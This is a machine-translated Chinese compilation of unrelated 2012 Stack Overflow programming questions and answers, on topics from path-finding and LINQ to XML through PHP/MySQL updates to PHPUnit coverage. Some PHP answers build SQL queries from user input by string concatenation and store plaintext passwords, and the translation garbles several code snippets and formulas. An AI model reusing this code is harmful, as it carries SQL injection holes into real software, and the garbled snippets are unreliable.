> 标签：c++, algorithm, recursion, path-finding, brute-force

我有两种对象，`Ball`和`Platform`。球有`(x,y)`坐标，平台有`(x_begin, x_end, y)`。最多可以有 80 个平台。

我被要求找到任何给定`Ball`到地面的最短路径（`y=0`）。请注意，此输出应仅为最小距离。

考虑到我认为最好使用蛮力的约束：计算到地面的所有可能距离，然后返回最小值。

![图。1](../Images/53d29aeb81b4598d5a40170baa8afc2e.png)

我想我会写一个递归函数：首先计算到最近平台的垂直距离，然后分支到左右，然后再返回。断开条件是所有路径都到达地面时。

```
 void calculateDistances(Ball b, vector<Platform> ps, vector<float>* distances)
    {
        //The idea is to have, for every branch
        // distances[i] = vertical distance
        // distances[i+1] = distance to right
        // distances[i+2] = distance to left
        Platform* p = NULL;
        float d_y = verticalDistanceToNearestPlatform(ps, p); // "p" now holds the platform the ball is on
        if (d_y == 0) 
            return; //already on floor
        distances->push_back(d_y);

        d_x_right = distanceToRightEdgeOfPlatform(p);
        distances->push_back(d_x_right);
        d_x_left = distanceToLeftEdgeOfPlatform(p);
        distances->push_back(d_x_left);
    } 
```

这里的问题很明显......我到底如何使这个递归？

非常感谢！

PS：这个问题打算在大约两个半小时内解决。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:40:48.143

递归解决方案（例如`horizontalDistanceToGround(x, y)`）将涉及计算从某个任意点`(x, y)`到地面上最近点的水平距离，如下所示：

*   `(x, y)`如果与地面之间没有平台，则返回 0。
*   如果`(x, y)`与地面之间有任何平台，则找到最近的此类平台（即最大`platform_y`小于的平台`y`）。如果该平台位于，则返回和`(platform_min_x, platform_max_x, platform_y)`的最小值。这基本上计算了从当前 x 位置到平台末端以及从那里到地面所需的最小距离。`(x - platform_min_x) + horizontalDistanceToGround(platform_min_x, platform_y)``(platform_max_x - x) + horizontalDistanceToGround(platform_max_x, platform_y)`

我会留下寻找`(x, y)`和地面之间最近的平台（如果有的话）让你弄清楚。

球到地面的最短距离为`distanceToGround(ball_x, ball_y) + ball_y`。

**注意：**根据@MooingDuck 关于垂直距离与递归无关的有用评论进行了更新。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:02:12.670

您可以将此问题转换为图问题，然后使用任意数量的图搜索算法来解决它。

为此，循环遍历所有平台并为它们的每个边缘以及直接位于另一个平台边缘下方的任何点创建节点。将共享一个公共平台的所有节点连接在一起。也进行垂直连接。

对地面执行相同的操作，但不要为边添加额外的节点，也不要连接地面节点

现在，您可以使用 Dijkstra 算法（一种重构变体）在图形中搜索顶部和底部*每个点之间的最短路径。*选择具有最低值的结果，您就完成了。Dijkstra 的算法在 O(N^2) 中运行，其中 N 是一个节点，用于幼稚实现和 O(E+N log N)，其中 E 是智能实现的边缘。

您也可以使用 A*，这可能更容易在紧要关头实现。

搜索从边缘掉下的球会击中哪个平台很容易。把地面当作一个平台。按高度对平台进行排序。对于每个平台，从最近的平台开始，线性地穿过它下面的所有平台。查看较高平台的 x 值是否落在较低平台边缘定义的范围内。这需要 O(P^2)。（P 是平台数量。）

这可能无法直接回答您的问题（即这不是蛮力），但我认为这是指向您的更好方向。另外，如果您尝试蛮力，球可以去的所有方向最终会像 O (2^P)，这是一个令人不快的高时间复杂度。

# c# - 使用 LINQ to XML 将 XML 文件插入现有 XML 文件

> ID：13870395
> 
> 赞同：0
> 
> 时间：2012-12-13T23:30:06.613
> 
> 标签：c#, xml, linq, xelement

使用[我在 SO 上找到的一些示例代码](https://stackoverflow.com/questions/670563/linq-to-read-xml/13868424#13868424)，我整理了一些代码来打开现有的 XML 数据库，打开另一个要插入到第一个 XML 中的 XML 文件，获取根节点的后代文件，并将它们附加到 database.xml 文件中选定节点的基部，然后将生成的文件保存到新的 XML 文件中。下面的代码在 VS2010 中编译和运行没有错误，但没有将 actionID.xml 文件中的 XML 添加到 database.xml 文件中，我不知道我缺少什么。

这是 C# 代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Xml.Linq;

class pcbdbUpdate
{
static void Main( )
    {
        //open database & load into memory
        XDocument PCBDB = XDocument.Load("C:\\database.xml");
        //open Activity Log file & load into memory
        XDocument addAction = XDocument.Load("C:\\actionID.xml");
        //get descendant node(s) below PCBDBActivityLog root node
        var actionXML = addAction.Root.Descendants("PCBDBActivityLog");
        /*supposed to write out child nodes, but not very useful, just tells me
        it's a:  System.Xml.Linq.XContainer+<GetDescendants>d__a*/
        Console.WriteLine(actionXML.ToString());
        //enumerate database for SBE_PCB_Data nodes
        IEnumerable<XElement> SBE_PCB_Data = PCBDB.Element("PCBDatabase").Elements("SBE_PCB_Data");
        //look for specific node with PCBID of "00001" and select it
        XElement newAction = SBE_PCB_Data.Where(p => p.Attribute("PCBID").Value == "00001").FirstOrDefault();
        //write descendants from Activity Log to base of node
        newAction.Add(actionXML);
        //save the resultant file
        PCBDB.Save("C:\\newDatabase.xml");
    }
} 
```

这是database.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<PCBDatabase>
  <SBE_PCB_Data PCBID="00001">
    <Creation ActionID="0002" User="DELLIOTTG:192.168.1.69" Date="2012-10-31T14:35:58" PCBID="00001">
      <PCBDrawing>00001a</PCBDrawing>
      <AssemblyDrawing>00001b</AssemblyDrawing>
      <Vendor>SBE</Vendor>
      <PONumber>00000</PONumber>
    </Creation>
    <Assignment ActionID="1295" User="RHO:192.168.1.6" Date="2012-12-13T08:59:31" PCBID="00001">
      <PCBDrawing>00002a</PCBDrawing>
      <AssemblyDrawing>00001c</AssemblyDrawing>
      <Vendor>SBE</Vendor>
      <PONumber>00001</PONumber>
    </Assignment>   
  </SBE_PCB_Data>
  <SBE_PCB_Data PCBID="00002">
    <Assignment ActionID="630c" User="DMUELLER:192.168.1.152" Date="2010-03-15T13:14:21" PCBID="00002">
      <SBEJobNumber>57380</SBEJobNumber>
    </Assignment>
  </SBE_PCB_Data>
</PCBDatabase> 
```

这是 actionID.xml：

```
<?xml version="1.0"?>
<PCBDBActivityLog>
    <Assignment ActionID='8353' User='DMUELLER:192.168.1.134' Date='2011-01-27T15:38:25' PCBID='00001'>
        <SBEPN>41528E</SBEPN>
    </Assignment>
</PCBDBActivityLog> 
```

生成的文件应如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<PCBDatabase>
  <SBE_PCB_Data PCBID="00001">
    <Creation ActionID="0002" User="DELLIOTTG:192.168.1.69" Date="2012-10-31T14:35:58" PCBID="00001">
      <PCBDrawing>00001a</PCBDrawing>
      <AssemblyDrawing>00001b</AssemblyDrawing>
      <Vendor>SBE</Vendor>
      <PONumber>00000</PONumber>
    </Creation>
    <Assignment ActionID="1295" User="RHO:192.168.1.6" Date="2012-12-13T08:59:31" PCBID="00001">
      <PCBDrawing>00002a</PCBDrawing>
      <AssemblyDrawing>00001c</AssemblyDrawing>
      <Vendor>SBE</Vendor>
      <PONumber>00001</PONumber>
    </Assignment>
    <Assignment ActionID='8353' User='DMUELLER:192.168.1.134' Date='2011-01-27T15:38:25' PCBID='00001'>
        <SBEPN>41528E</SBEPN>
    </Assignment>
  </SBE_PCB_Data>
  <SBE_PCB_Data PCBID="00002">
    <Assignment ActionID="630c" User="DMUELLER:192.168.1.152" Date="2010-03-15T13:14:21" PCBID="00002">
      <SBEJobNumber>57380</SBEJobNumber>
    </Assignment>
  </SBE_PCB_Data>
</PCBDatabase> 
```

我错过了什么或做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:40:28.950

错误在这里：

```
var actionXML = addAction.Root.Descendants("PCBDBActivityLog")` 
```

您正在尝试`<PCBDBActivityLog>`在文档根目录下查找元素。但这不会返回任何内容，因为`<PCBDBActivityLog>`element**是**`actionID.xml`文档的根。将此行替换为

```
var actionXML = addAction.Descendants("PCBDBActivityLog"); 
```

或者

```
var actionXML = addAction.Root; 
```

# caching - JCS - 从数据库动态更新缓存

> ID：13870396
> 
> 赞同：0
> 
> 时间：2012-12-13T23:30:10.220
> 
> 标签：caching, synchronization, refresh, sync, jcs

我维护一个利用 JCS 将缓存保存在 JVM ( **JVM1** ) 中的应用程序。当 JVM 启动/重新启动时，该数据将首次从数据库加载。

但是，数据库将从不同的 JVM ( **JVM2** ) 访问，并有助于将数据添加到数据库。

为了确保这些附加/新添加的记录加载到缓存中，我们需要为数据库中的每个添加重新启动**JVM1**。

有没有办法我们可以定期刷新/加载**JVM1**中的缓存（仅用于新添加的记录） （而不是频繁的数据库轮询）？

谢谢，贾亚克里希纳

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-20T07:12:56.067

难道你不能简单地让JVM1首先检查内存缓存，然后，如果内存缓存中不存在该项目，则检查数据库缓存吗？

但是，如果您需要列出存在的所有项目，某些类型，并且不想访问数据库。然后，为了让 JVM1 知道数据库中有一个新项目，我想要么 1) JVM2 必须向 JVM1 发送一条网络消息，告诉它数据库中有新条目。或者 2) 可能有一个数据库触发器在插入新数据时触发，并向 JVM1 发送网络消息。（但我认为让*数据库*向应用服务器发送网络消息感觉很奇怪。）——我认为这些方法似乎相当复杂。

您是否考虑过某种 new-item-ids 表，它记录最近插入数据库的项目的 ID？它可以由数据库触发器更新，或者当它们写入数据库时​​由 JVM1 和 2 更新。然后 JVM1 可能只需要每秒轮询这个单个表一次，以获取新 ID 列表，然后它可以从数据库中加载新项目。

最后，你考虑过分布式缓存吗？这样 JVM1 和 2 共享同一个缓存，并且 JVM1 和 2 在将项目插入数据库时​​将它们写入此缓存。（这种方式有点类似于在 JVM1 和 2 之间发送网络消息，但是分布式缓存系统会自己发送消息，所以你不需要编写任何新代码）

# javascript - 仅使用 javascript 从 pdf 文件中提取文本

> ID：13870400
> 
> 赞同：3
> 
> 时间：2012-12-13T23:30:16.227
> 
> 标签：javascript, pdf, extract

如何在客户端和任何浏览器中仅使用 javascript 从 pdf 文件中提取数据？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:43:04.013

pdf.js 是一个 JavaScript pdf 阅读器：http: [//mozilla.github.com/pdf.js/](http://mozilla.github.com/pdf.js/)

一些类似的项目：

*   对于 docx 和 xlsx：[http ://blog.innovatejs.com/?p=184](http://blog.innovatejs.com/?p=184)
*   jsPDF 是一个 pdf 生成器：[https ://github.com/MrRio/jsPDF](https://github.com/MrRio/jsPDF)

如果您询问如何加载文件，这可以通过 ajax 请求来完成，但您将无法直接读取文件内容。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-13T23:32:07.090

你要问的几乎是不可能的。

PDF 是一种重量级格式，针对大型复杂文档的高效显示进行了优化，而不是针对进一步处理进行了优化。（事实上​​，PDF 文档主要由绝对位于页面上的字母形状和其他图形组成。任何表示“文本段落”的数据都是标记 PDF 的可选功能。）

文本提取往往是（通常是昂贵的）PDF 库的一个功能，据我所知，Javascript 不存在这样的库。Scribd 和 Google Docs 这样做，但他们可能不分享如何，我猜他们是在服务器端这样做的。

**tl; dr：** PDF，作为一种格式，对此很糟糕。除非您的应用程序的全部重点基本上是从 PDF 中提取文本，否则您最好花时间弄清楚如何不必这样做。

# javascript - 为对话框连接 Backbone.js 视图和模板

> ID：13870403
> 
> 赞同：1
> 
> 时间：2012-12-13T23:30:29.117
> 
> 标签：javascript, backbone.js

在 Backbone.js 模板模板/营养素/show_template.jst.ejs 中，我有这个：

```
<div id="nutrient_container">
<table class="person_nutrients">
...
<% for(var i=0; i < person[nutrientsToRender]().length; i++) { %>
  <% var nutrient = y[x[i]]; %>
  <tr class="deficent_nutrients">
    <td>
    <span class="nutrient_name"><%= I18n.t(nutrient.name) %></span>
    </td>
    <td><a id="show_synonyms" href="#"><%= I18n.t("Synonyms") %></a></td>
<% } %>
</table>
</div> 
```

然后，在 Backbone.js 视图中，views/nutrients/show_view.js，我有这个：

```
el: 'table.person_nutrients',
parent_el: 'div#nutrient-graphs',
template: JST["backbone/templates/nutrients/show_template"],
initialize: function(options) {
  ...
  this.render()
},
events: {
    'click a#show_synonyms':'synonyms_event'
},
render: function() {
  ...
  $(this.parent_el).append(this.template({person: this.model_object, nutrientsToRender: this.nutrientsToRender(), x: x_prep, y: y_prep}))
}, 
synonyms_event: function(event) {
  alert("I got called");
} 
```

为什么没有触发事件（警报框）？我单击“同义词”的链接，我得到的只是根 url，后面有一个 #。为什么 Javascript 不匹配？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T02:40:32.713

我认为您误解了视图 el 的工作方式。

在主干.js 视图中总是引用一个 DOM 元素，它是它的 DOM 元素`el`，这个 DOM 元素可以是页面 DOM 中的现有元素，也可以是 DOM 上不存在的新元素。

Backbone.js 中的视图*监听*事件的方式是将它们*委托*（绑定）到它的[el](http://backbonejs.org/#View-el)。如果视图的 el 发生变化，或者您想更改它侦听的事件，您也可以通过调用[delegateEvents](http://backbonejs.org/#View-delegateEvents)方法手动（重新）委托事件

视图有两种常见的模式，一种是视图引用 DOM 上的现有元素（这是通过指定它的 el 属性或在实例化时传入一个 el 来完成的），第二种是视图的 el 没有引用 DOM 上的现有元素，而是在其 el 中呈现一些 HTML，然后将其插入 DOM。

通常所做的是，您有一个引用 DOM 上现有元素的父视图（通常是集合视图），然后是一堆其 el 被附加的子视图。

在您的情况下，您可能希望将视图拆分为引用更高*容器*div 的父视图，并将子视图的 els 附加到其中。

例如

```
<div id="dvContainer">

<div id="synomCont"></div>
<input type="button" id="btnAdd" value="add" />
</div>

var ParentView = Backbone.Views.extend({

   el: 'dvContainer',

   events: {
       "click #add" : "addSyn"
   },

   addSyn: function() {
      //here you can create a model with the approptate data, and pass that in to
      // the view
      var view = new SynomView();
      this.$el.find('#synomCont').append(view.render().el);
   }
}) 
```

# ios - 为外部主键创建 NSPredicate

> ID：13870405
> 
> 赞同：2
> 
> 时间：2012-12-13T23:30:50.620
> 
> 标签：ios, subquery, nsfetchrequest

我查看了其他问题，并看到了答案的一瞥，但没有一个有效。

这是我的情况，我有两个对象“菜单”和“餐厅”。菜单是我拥有所有菜单项的地方，“餐厅”是不同餐厅的名称。所以：

Menu Object - menuId - name - protein - restaurantID（一对一）

餐厅对象 - restaurantID（一对多） - 名称

当用户给我餐厅名称时，我想返回菜单项。在 SQL 中，它将是：

```
SELECT * FROM ZMENU WHERE zrestaurantId = (SELECT Z_PK FROM ZRESTAURANT WHERE zname="Starbucks") 
```

我试过了

```
NSFetchRequest *request = [[NSFetchRequest alloc] init];
NSEntityDescription *e = [[model entitiesByName] objectForKey:@"Restaurant"];
[request setEntity:e];
*NSPredicate *predicate = [NSPredicate predicateWithFormat:@"(restaurant = (SUBQUERY(Restaurant, $x, $x.name like[cd] %@).@count))", restaurantName]; 
```

但我得到了错误

```
'NSInvalidArgumentException', reason: 'Unable to generate SQL for predicate (restaurant == SUBQUERY(Restaurant, $x, $x.name LIKE[cd] "Starbucks").@count) (problem on RHS)' 
```

有人可以帮忙吗？我想避免必须进行两次提取（一次用于餐厅 PK，另一次用于菜单项），我相信应该有更合适的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:34:38.520

我知道了！！！！！

创建元素是正确的，只需将子查询更改为

NSEntityDescription *e = [[模型实体ByName] objectForKey:@"Menu"]; [请求设置实体：e]；

NSString restaurantName = @"星巴克";

```
 NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SUBQUERY(restaurantId, $x, $x.name == %@).@count != 0", restaurantName]; 
```

所以子查询的工作方式是——你通过设置实体来建立你想要获取的对象（在表上选择）。然后在谓词上，您对引用外部表的字段使用子查询。然后，您在该表中指定要检查的字段，就是这样！我不知道为什么会有“计数”，但它确实有效。

顺便说一句，在子查询中，您可以将 %@ 用于要检查的整数或字符串值，并且可以将 %K 用于要检查的字段名称。很酷！:-D

# c# - 解析字符串并删除标签和文本

> ID：13870406
> 
> 赞同：0
> 
> 时间：2012-12-13T23:30:51.887
> 
> 标签：c#, asp.net, regex, string, replace

网络请求工作正常，一切都按计划进行，但由于某种原因，我似乎无法抓住并删除那一段字符串。下面的删除是许多尝试中的一种，

*我没有我的人的来源，所以我会尝试重新创建它。*

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Net; 
using System.Text;
using System.IO;

public partial class test : System.Web.UI.Page
{

protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
        StringBuilder sb = new StringBuilder();

        byte[] srs = new byte[8192];
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http:"+//mywebsite.com/getsearchresults/page.aspx="+ result["x"]);

        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        Stream xStream = response.GetResponseStream();

        string myString = null;
        int count = 0;

        do
        {
            count = xStream.Read(srs, 0, srs.Length);
            if (count != 0)
            {
                myString = Encoding.ASCII.GetString(srs, 0, count);
        //regex ismatch = new myString.regex (@"\The Following Results Are\b")
        //ismatch = regex.replace("The Follwing Results Are","",1);         
                   sb.Append(myString);
              }
            }
            while (count > 0);
            printresults.Text = sb.ToString();

       }

   }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:57:08.500

那么你的正则表达式是错误的。我看不出您希望该模式`@"\The Followin Results Are\b"`如何匹配“以下结果”

有几个问题，首先，模式以`\`不在输入中的 a 开头，我相信这只是被解释为文字。`\t`将匹配一个选项卡，并且该选项卡也不在输入中，因此无论哪种方式都是错误的。第二个问题是`\b`与退格或单词边界匹配。我认为这也不会在这里起作用，因为输入在该单词的末尾结束，并且当您有单词边界时会找到匹配项`\w\W`（单词字符后跟非单词字符）。那里没有边界，因为那里是输入的尽头。

除非您非常担心“以下结果是”的多次出现，否则您应该`string.Replace`像这样调用该方法；

```
 string foo = oldString.Replace("The Following Results Are", System.String.Empty); 
```

如果您需要确保只替换第一个匹配项，您应该这样做；

```
 RegEx rgx = new RegEx("The Following Results Are");
 string foo = rgx.Replace(oldString, System.String.Empty, 1); 
```

# php - 在多维数组中搜索字符串并获取密钥

> ID：13870411
> 
> 赞同：4
> 
> 时间：2012-12-13T23:31:00.770
> 
> 标签：php, arrays

我正在使用 PDO Api，并使用`fetchAll()`返回一个多维数组；下面的这段代码只是一个测试场景；我只是想知道这是否可能。

```
$LeUsername = "BravoSlayer"; 
$sth = $dbh->prepare("SELECT * FROM users WHERE Username='$LeUsername'");
$sth->execute();
$result = $sth->fetchAll();
print_r($result);
$ArraySearch = search_array($result, $LeUsername); 
```

输出如下：

```
Array ( [0] => Array ( [ID] => 1 [0] => 1 [Username] => bravoslayer [1] => bravoslayer [Password] => thisisatest [2] => thisisatest ) ) 
```

我想通过多维数组搜索返回键。在这种情况下，它将为 0，所以我可以为 $Array1 = $Array1['0'] 关联另一个变量变量，这样我就可以这样做：

```
$Username = $Array1['Username']; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T02:49:13.490

从你的问题来看。`foreach`您可以在循环中搜索主数组并使用它`in_array`来返回正确的数组。

将此作为您的参考。

```
function Search_Array($Array, $SearchDilema)
    {
        foreach ($Array AS $CheckKeys)
        {
            if (in_array($SearchDilema, $CheckKeys))
            {
                return $CheckKeys;
            }
            else
            {
                $ErrorMsg = "No Results Found! Check Your Search Dilema"; 
                return $ErrorMsg;
            }
        }

    } 
```

# php - 一次查询更新多条 MySQL 记录

> ID：13870418
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:31:40.013
> 
> 标签：php, mysql, sql-update

我想从同一个表中更新多个 MySQL 记录，只使用一个提交按钮。

这是我用来生成表单的代码的简单版本：

```
<form action='' method='post'> 
    <?php 
    $sql = "SELECT TagName, TagID FROM tags";
    $result = mysql_query($sql) or die ($sql. '-error' .mysql_error());

    while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
        echo "<input type='text' name='TagField' value='".$row['TagName']."'>";
    }
    ?>
    <input type="submit" name="tag_edit_submit" value="Edit">
</form> 
```

我可以使用哪种 UPDATE 查询？我似乎无法弄清楚数组/循环的正确组合来实现它。如果您需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:44:52.940

您可以在表单中携带带有标签名称的 tagId。我假设 tagIds 计数和 tagNames 计数是相同的。

```
<form action='' method='post'> 
    <?php 
    $sql = "SELECT TagName, TagID FROM tags";
    $result = mysql_query($sql) or die ($sql. '-error' .mysql_error());

    while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
        echo "<input type='hidden' name='TagIDs[]' value='".$row['TagID']."'>";
        echo "<input type='text' name='TagNames[]' value='".$row['TagName']."'>";
    }
    ?>
    <input type="submit" name="tag_edit_submit" value="Edit">
</form>

<?php 
$p=$_POST;
if( isset($p['TagNames']) && is_array($p['TagNames'] )) {

  foreach($p['TagNames'] as $key=>$name){

    $tagId= $p['TagIds'][$key];

    // validate and clean up sql injections from $tagId and $name

    $sql='update tags set TagName="'.$name.'" where TagID=".$tagId." limit 1';
    // execute the query
  }

} 
?> 
```

# c# - Entity Framework 5 建议 - 摘要视图

> ID：13870422
> 
> 赞同：0
> 
> 时间：2012-12-13T23:31:56.137
> 
> 标签：c#, entity-framework

我有一个视图，用于汇总标签用于描述我们应用程序中项目的次数。每个项目都有一组标签，当显示标签时，我想显示使用了多少次（并链接到其他项目）。标记对象看起来像

```
public class Tag {
    public int TagID { get; set; }
    public int ProjectID { get; set; }
    public string TagValue { get; set; }

    //public int TagCount { get {LINQ Query returning count from View}; }
} 
```

视图只是 TagValue 和出现次数。我的问题是：

1.  我应该像这样使用带有 EF 的视图吗？
2.  查询这样的视图最优雅的方法是什么？
3.  我在哪里以及如何让 EF 知道这个视图，以便我可以像查询任何其他实体一样使用 LINQ 来查询它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T18:57:04.660

我在这里重新询问了我试图在上面提出的问题的核心，并给出了答案： [具有计算属性的实体框架](https://stackoverflow.com/questions/13882899/entity-framework-with-calculated-property)

感谢所有评论的人！

# ruby-on-rails - 从导航栏登录，并停留在当前页面

> ID：13870435
> 
> 赞同：0
> 
> 时间：2012-12-13T23:32:47.657
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我已经完成了 Michael Hartl 的 Ruby on Rails 教程，并且还实现了一个包含在我的应用程序导航栏上的小型登录表单（因此用户可以从实际登录页面或导航栏登录）。如果用户从登录页面登录，我确实希望他们重定向到 root_url。

但是，如果用户从导航栏表单登录，我希望他们留在同一页面上并显示“成功登录！” 页面顶部的消息。我怎样才能做到这一点？

我的代码如下：

从`_header.html.erb`文件中：

```
<%= form_tag sessions_path, class: "navbar-form pull-right" do %>
  <%= text_field_tag :email, nil, class: "input-small", placeholder: "Email" %>
  <%= password_field_tag :password, nil, class: "input-small", placeholder: "Password" %>
  <%= check_box_tag :remember_me, 1, params[:remember_me], title: "select to remember login" %>
  <%= submit_tag "Sign in", class: "btn btn-mini" %>
<% end %> 
```

从`sessions_helper.rb`文件中：

```
def redirect_back_or(default)
  redirect_to(session[:return_to] || default)
  session.delete(:return_to)
end

def store_location
  session[:return_to] = request.url
end 
```

我试图利用 中的`redirect_back_or`方法`sessions_helper.rb`，但它似乎将会话路径捕获为 session[:return_to] 值，而不是登录请求的原始页面。我会很感激你的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T07:44:59.537

我终于能够弄清楚这一点...

在我的`sessions_helper.rb`文件（已包含在 中`ApplicationController`）中，我添加了以下代码：

```
def store_location_login
  session[:referral_url] = request.referer
end

def redirect_back_login_or(default)
  if URI(signin_path).path == URI(session[:referral_url]).path
  redirect_to root_url
else
  redirect_to(session[:referral_url] || default)
end

session.delete(:referral_url) 
```

然后我将`SessionsController`创建操作更改为：

```
def create
  user = User.find_by_email(params[:email].downcase)
  store_location_login

  if user && user.authenticate(params[:password])
    if params[:remember_me]
      sign_in user
    else
      sign_in_temp user
    end

    flash[:success] = "Successfully logged in!"
    redirect_back_login_or root_url

  else
    flash.now[:error] = 'Invalid email/password combination'
    render 'new'

  end
end 
```

这些更改会产生所需的行为：

*   从主登录页面登录，成功登录后会将用户重定向到 root_url
*   从站点导航栏中的登录表单登录，它会重定向回原始页面（除非原始页面是主登录表单）
*   这对每个使用相同的会话控制器创建方法

我猜这可以重构一些，但它有效。

# git - 让 TextMate 指出与 GIT 项目有关的文件已过期

> ID：13870436
> 
> 赞同：1
> 
> 时间：2012-12-13T23:32:50.543
> 
> 标签：git, textmate

我刚刚创建了一个 GIT 项目，并在 TextMate 中打开了它，我想知道是否可以让文件资源管理器在文件与最新提交不同时标记文件。我来自使用 IntelliJ，所以我习惯于在进行更改时更改文件名的颜色。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-07T02:54:29.147

TextMate 2 在其文件浏览器中有 git 标记。它仍处于测试阶段，但如果您问我，它是开源的并且非常有用。

[https://github.com/textmate/textmate](https://github.com/textmate/textmate)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T15:06:54.107

如果您安装[Project+](http://ciaranwal.sh/2008/08/05/textmate-plug-in-projectplus)插件，您会发现它可以选择在文件名旁边添加图标状态标志。请注意，在 Lion 和更高版本上，它会导致 TextMate 经常崩溃，因此它可能不是一个可用的解决方案。

# php - 为什么switch语句总是使用默认值？

> ID：13870450
> 
> 赞同：2
> 
> 时间：2012-12-13T23:35:01.087
> 
> 标签：php, codeigniter

好的，我查找了所有内容，甚至尝试修剪我的输入。但无论我做什么，我的 switch 语句都会默认为 default 语句。但是，当字母数字结果为 FALSE 时，它还会显示该错误消息以及默认错误消息。它最终显示了他们两个......这没有意义，因为 CASE 语句通常只是一个结果......

谁能告诉我为什么会这样？

```
function match_pattern($str, $pattern) {
        $pattern = trim($pattern);
        switch($pattern) {
            case 'alphanum':
                if( ! preg_match('/^[A-Za-z0-9]{1,}$/', $str))
                {
                    //error message must be same as function name
                    $this->set_message('match_pattern', 'The %s field must only contain alpha-characters or numbers!');
                    return false;  //failed
                }
                break;
            case 'numeric':
                if( ! preg_match('/^[0-9]{,}%/', $str)) {
                    $this->set_message('match_pattern', 'The %s field must only contain numeric characters!');
                    return false; //failed
                }
                break;
            default:
                $this->set_message('match_pattern', 'Invalid pattern');
                return false;
        }
        return true;  //passed
    } 
```

然后这是调用它的东西：

```
$this->form_validation->set_rules('username', 'Username', 'required|match_pattern[alphanum]|min_length[3]|max_length[25]|is_unique[user.username]'); 
```

是的，这是 CodeIgniter。如果字母数字显示为假（在这种情况下为真），它将显示错误消息。但是，如果我键入“lilmousiee”，它不会显示错误消息，因为它传递了 preg_match 表达式。但无论我输入什么，它总是显示“无效模式”错误消息。有时它会在我输入“lilmousiee 6”时显示和字母错误消息，因为它不允许空格。它如何仍然同时显示默认值和另一个？..这里有什么不对...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:13:40.520

@femtoRgon 是正确的！我有一个 match_pattern[alpha_num_space]，但没有 case 声明，所以它也是默认的！因此它有时会显示两条错误消息的原因！

谢谢！

# php - 从 PHPUnit 代码覆盖中排除基目录

> ID：13870454
> 
> 赞同：8
> 
> 时间：2012-12-13T23:35:31.050
> 
> 标签：php, unit-testing, phpunit, code-coverage, xdebug

如何从 PHPUnit 的代码覆盖率中排除基本目录？

这是我的 phpunit.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<phpunit bootstrap="include.php"
         stopOnError="false"
         stopOnFailure="false"
         stopOnIncomplete="false"
         stopOnSkipped="false">
    <testsuite name="MyProject">
        <directory>classes/*</directory>
    </testsuite>
    <logging>
        <log type="coverage-html" target="../reports/coverage" charset="UTF-8" yui="true" highlight="false" lowUpperBound="35" highLowerBound="70"/>
        <log type="coverage-xml" target="../reports/coverage.xml"/>
        <log type="test-xml" target="../reports/logfile.xml" logIncompleteSkipped="false"/>
        <log type="testdox-html" target="../reports/testdox.html"/>
        <log type="testdox-text" target="../reports/testdox.txt"/>
    </logging>
</phpunit> 
```

当它输出时，它包括所有基本目录，例如：

```
c:\work\some\path\MyProject 
```

如何使其仅包含`...\MyProject\*`在代码覆盖率输出中？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-14T09:51:39.327

您的答案并没有真正描述您的项目布局，但我假设您正在寻找的是：

[**包含和排除代码覆盖的文件**](https://phpunit.de/manual/current/en/appendixes.configuration.html#appendixes.configuration.blacklist-whitelist)

这允许您指定 PHPUnit 在生成代码覆盖率时将关心的文件的白名单。

不在该白名单上的所有内容都不会显示在报告中。

为此，请在顶层添加以下内容：

```
<filter>
  <whitelist processUncoveredFilesFromWhitelist="true">
    <directory suffix=".php">.../MyProject/</directory>
  </whitelist>
</filter> 
```

# asp.net-mvc-3 - 尝试根据 Orchard 中的枚举保存复选框选择（NHibernate）

> ID：13870455
> 
> 赞同：3
> 
> 时间：2012-12-13T23:35:34.310
> 
> 标签：asp.net-mvc-3, nhibernate, orchardcms

我花了五 (5) 天的大部分时间试图弄清楚如何完成这项工作：

我使用`enum`'s 通过单选按钮列表、下拉列表（这些是多个选项中的一 (1) 个选项）以及复选框列表和多选列表（这些是多种选择中的一 (1) 种）。

现在，使用单选按钮列表和下拉列表，我可以毫无问题地保存在 Orchard 数据库中。用户选择一个选项，该选项将作为特定选项保存`enum`到数据库中。

但是，使用复选框列表或多选择列表，我无法让 Orchard/NHibernate 保存多个 selected `enum`。

我已经尝试**了**在 SO 上或通过 Google 搜索可以找到的所有内容。唯一“可行”的解决方案，在这种情况下是多余的，是创建一个新表（通过迁移）/部分/部分记录组合，只是为了在某些情况下存储 7-8 个选择。然后，当然，我可以做类似的事情`public virtual IList<NewContentPartRecord> { get; set; }`。

